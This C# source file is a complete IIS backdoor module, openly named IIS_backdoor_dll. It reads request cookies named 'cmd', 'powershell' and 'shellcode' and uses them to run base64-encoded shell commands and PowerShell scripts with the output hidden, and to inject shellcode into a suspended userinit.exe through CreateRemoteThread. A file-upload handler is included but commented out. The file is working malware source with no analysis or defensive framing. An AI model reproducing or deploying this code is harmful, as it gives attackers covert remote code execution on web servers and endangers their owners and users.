using System;
using System.Collections;
using System.Collections.ObjectModel;
using System.Diagnostics;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Runtime.InteropServices;
using System.Text;
using System.Web;
using static IIS_backdoor_dll.Program;

namespace IIS_backdoor_dll
{
    public static class Program
    {
        [StructLayout(LayoutKind.Sequential)]
        public class SecurityAttributes
        {
            public Int32 Length = 0;
            public IntPtr lpSecurityDescriptor = IntPtr.Zero;
            public bool bInheritHandle = false;

            public SecurityAttributes()
            {
                this.Length = Marshal.SizeOf(this);
            }
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct ProcessInformation
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public Int32 dwProcessId;
            public Int32 dwThreadId;
        }
        [Flags]
        public enum CreateProcessFlags : uint
        {
            DEBUG_PROCESS = 0x00000001,
            DEBUG_ONLY_THIS_PROCESS = 0x00000002,
            CREATE_SUSPENDED = 0x00000004,
            DETACHED_PROCESS = 0x00000008,
            CREATE_NEW_CONSOLE = 0x00000010,
            NORMAL_PRIORITY_CLASS = 0x00000020,
            IDLE_PRIORITY_CLASS = 0x00000040,
            HIGH_PRIORITY_CLASS = 0x00000080,
            REALTIME_PRIORITY_CLASS = 0x00000100,
            CREATE_NEW_PROCESS_GROUP = 0x00000200,
            CREATE_UNICODE_ENVIRONMENT = 0x00000400,
            CREATE_SEPARATE_WOW_VDM = 0x00000800,
            CREATE_SHARED_WOW_VDM = 0x00001000,
            CREATE_FORCEDOS = 0x00002000,
            BELOW_NORMAL_PRIORITY_CLASS = 0x00004000,
            ABOVE_NORMAL_PRIORITY_CLASS = 0x00008000,
            INHERIT_PARENT_AFFINITY = 0x00010000,
            INHERIT_CALLER_PRIORITY = 0x00020000,
            CREATE_PROTECTED_PROCESS = 0x00040000,
            EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
            PROCESS_MODE_BACKGROUND_BEGIN = 0x00100000,
            PROCESS_MODE_BACKGROUND_END = 0x00200000,
            CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
            CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
            CREATE_DEFAULT_ERROR_MODE = 0x04000000,
            CREATE_NO_WINDOW = 0x08000000,
            PROFILE_USER = 0x10000000,
            PROFILE_KERNEL = 0x20000000,
            PROFILE_SERVER = 0x40000000,
            CREATE_IGNORE_SYSTEM_DEFAULT = 0x80000000,
        }


        [StructLayout(LayoutKind.Sequential)]
        public class StartupInfo
        {
            public Int32 cb = 0;
            public IntPtr lpReserved = IntPtr.Zero;
            public IntPtr lpDesktop = IntPtr.Zero;
            public IntPtr lpTitle = IntPtr.Zero;
            public Int32 dwX = 0;
            public Int32 dwY = 0;
            public Int32 dwXSize = 0;
            public Int32 dwYSize = 0;
            public Int32 dwXCountChars = 0;
            public Int32 dwYCountChars = 0;
            public Int32 dwFillAttribute = 0;
            public Int32 dwFlags = 0;
            public Int16 wShowWindow = 0;
            public Int16 cbReserved2 = 0;
            public IntPtr lpReserved2 = IntPtr.Zero;
            public IntPtr hStdInput = IntPtr.Zero;
            public IntPtr hStdOutput = IntPtr.Zero;
            public IntPtr hStdError = IntPtr.Zero;
            public StartupInfo()
            {
                this.cb = Marshal.SizeOf(this);
            }
        }
        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateProcessA(String lpApplicationName, String lpCommandLine, SecurityAttributes lpProcessAttributes, SecurityAttributes lpThreadAttributes, Boolean bInheritHandles, CreateProcessFlags dwCreationFlags,
                IntPtr lpEnvironment,
                String lpCurrentDirectory,
                [In] StartupInfo lpStartupInfo,
                out ProcessInformation lpProcessInformation

            );

        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] buffer, IntPtr dwSize, int lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);


        public static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        public static UInt32 MEM_COMMIT = 0x1000;
    }
    public class IISModule : IHttpModule

    {

        public void Init(HttpApplication context)
        {
            context.BeginRequest += new EventHandler(context_BeginRequest);
            
        }

        /// <summary>
        /// 执行cmd命令
        /// </summary>
        /// <param name="cmd"></param>
        /// <returns></returns>
        public string RunCmd(string cmd)
        {
            cmd = Encoding.UTF8.GetString(Convert.FromBase64String(cmd));
            Process proc = new Process();
            proc.StartInfo.CreateNoWindow = true;
            proc.StartInfo.FileName = "cmd.exe";
            proc.StartInfo.UseShellExecute = false;
            proc.StartInfo.RedirectStandardError = true;
            proc.StartInfo.RedirectStandardInput = true;
            proc.StartInfo.RedirectStandardOutput = true;
            proc.Start();
            proc.StandardInput.WriteLine(cmd);
            proc.StandardInput.WriteLine("exit");
            string outStr = proc.StandardOutput.ReadToEnd();
            proc.Close();
            return outStr;
        }

        /// <summary>
        /// 执行powershell
        /// </summary>
        /// <param name="scriptText"></param>
        /// <returns></returns>
        public static string Runpscmd(string pscmd)
        {
            pscmd = Encoding.UTF8.GetString(Convert.FromBase64String(pscmd));
            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();
            Pipeline pipeline = runspace.CreatePipeline();
            pipeline.Commands.AddScript(pscmd);
            pipeline.Commands.Add("Out-String");
            Collection<PSObject> results = pipeline.Invoke();
            runspace.Close();
            StringBuilder stringBuilder = new StringBuilder();
            foreach (PSObject obj in results)
            {
                stringBuilder.AppendLine(obj.ToString());
            }
            return stringBuilder.ToString();
        }
        
        /// <summary>
        /// 上传文件
        /// </summary>
        /// <param name="base64"></param>
        /// <returns></returns>
        public string upload_file(string base64)
        {
            string[] str = base64.Split('|');
            var bytes=Convert.FromBase64String(str[0]);
            string decode = Encoding.UTF8.GetString(bytes);
            System.IO.File.WriteAllText(str[1], decode, Encoding.UTF8);
            return "ok";
        }

        /// <summary>
        /// 执行shellcode
        /// </summary>
        /// <param name="base64"></param>
        /// <returns></returns>
        public string shellcode(string base64)
        {
            string[] arr = base64.Split('|');
            if (arr[1].Equals(is_x86()))
            {
                byte[] sc = Convert.FromBase64String(arr[0]);
                string binary = "userinit.exe";
                Int32 size = sc.Length;
                StartupInfo sInfo = new StartupInfo();
                sInfo.dwFlags = 0;
                ProcessInformation pInfo;
                string binaryPath = "C:\\Windows\\System32\\" + binary;
                IntPtr funcAddr = CreateProcessA(binaryPath, null, null, null, true, CreateProcessFlags.CREATE_SUSPENDED, IntPtr.Zero, null, sInfo, out pInfo);
                IntPtr hProcess = pInfo.hProcess;
                IntPtr spaceAddr = VirtualAllocEx(hProcess, new IntPtr(0), size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

                int test = 0;
                IntPtr size2 = new IntPtr(sc.Length);
                bool bWrite = WriteProcessMemory(hProcess, spaceAddr, sc, size2, test);
                CreateRemoteThread(hProcess, new IntPtr(0), new uint(), spaceAddr, new IntPtr(0), new uint(), new IntPtr(0));
                return Convert.ToString(sc.Length);
            }
            else
            {
                return "!Target requires"+is_x86()+" shellcode";
            }
        }
        

        void context_BeginRequest(object sender, EventArgs e)
        {
            HttpApplication application = (HttpApplication)sender;
            HttpContext context = application.Context;
            HttpRequest Request = application.Request;

            context_filter(context, Request);
        }
        string is_x86()
        {
            if (IntPtr.Size == 4)
            {
                return "x86";
            }
            else
            {
                return "x64";
            }
        }
        void context_filter(HttpContext context, HttpRequest Request)
        {
            HttpCookieCollection MyCookieColl;
            HttpCookie MyCookie;
            MyCookieColl = Request.Cookies;
            String[] arr1 = MyCookieColl.AllKeys;

            if (arr1.Length > 0)
            {
                MyCookie = MyCookieColl[arr1[0]];
                if (MyCookie.Name.Equals("cmd"))
                {
                    String cookie = MyCookie.Value;
                    context.Response.Clear();
                    context.Response.Write(RunCmd(cookie));
                    context.Response.End();
                    context.Response.Close();
                }
                
                else if (MyCookie.Name.Equals("powershell"))
                {
                    String cookie = MyCookie.Value;
                    context.Response.Clear();
                    context.Response.Write(Runpscmd(cookie));
                    context.Response.End();
                    context.Response.Close();
                }
                //else if (MyCookie.Name.Equals("upload"))
                //{
                //    String cookie = MyCookie.Value;
                //    context.Response.Clear();
                //    context.Response.Write(upload_file(cookie));
                //    context.Response.End();
                //    context.Response.Close();
                //}
                else if (MyCookie.Name.Equals("shellcode"))
                {
                    String cookie = MyCookie.Value;
                    context.Response.Clear();
                    context.Response.Write(shellcode(cookie));
                    context.Response.End();
                    context.Response.Close();
                }

            }
        }
        public void Dispose()
        {
        }
    }
}
